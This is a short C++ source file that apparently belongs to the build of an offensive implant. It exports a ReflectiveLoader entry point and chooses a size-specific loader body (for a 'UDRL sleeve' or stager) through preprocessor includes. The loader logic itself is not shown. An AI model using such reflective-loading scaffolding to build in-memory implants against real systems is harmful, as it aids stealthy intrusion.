#include "ReflectiveLoader.h"
#define RefLoadSize 5
/* C-56: BOFWIN_ENABLE marks the rl0k variant (own-exe/UDRL sleeve - no
 * official-stager 5K cap). Its wall is 50K so the REAL reflective loader
 * (~5.5KB) fits; the 5K wall could only ever hold a stub. NOTE: an
 * unconditional '#define RefLoadSize 5' sits above - any /p:RefLoadSize
 * property is a C4005 redefinition that LOSES to it; variant selection
 * must happen here in the source (the vcxproj $(RefLoadSize) plumbing was
 * always dead). */
#if defined(BOFWIN_ENABLE)
#undef RefLoadSize
#define RefLoadSize 50
#endif

/* extern "C"：本函数是加载器 stub 经名字/序号定位的唯一导出入口，必须以未修饰
   的 C 符号导出。C++ 编译单元下缺省会被名字修饰，GetProcAddress 按原名查找会失败。
   x86 WINAPI 仍会 stdcall 修饰成 _ReflectiveLoader@4，再 fort 一个无修饰别名。 */
#if defined(_M_IX86)
#pragma comment(linker, "/EXPORT:ReflectiveLoader=_ReflectiveLoader@4")
#endif
extern "C" DLLEXPORT UINT_PTR WINAPI ReflectiveLoader(LPVOID lpParameter) {

#if defined(RefLoadSize)
	#if RefLoadSize == 5
		#include "ReflectiveLoader.5k"
	#elif RefLoadSize == 50
		#include "ReflectiveLoader.50k"
	#elif RefLoadSize == 100
		#include "ReflectiveLoader.100k"
	#elif RefLoadSize == 1000
		#include "ReflectiveLoader.1000k.boom"
	#else
		#include "ReflectiveLoader.unknown.size.boom"
	#endif
#else
	#include "ReflectiveLoader.5k"
#endif

	return 0;
}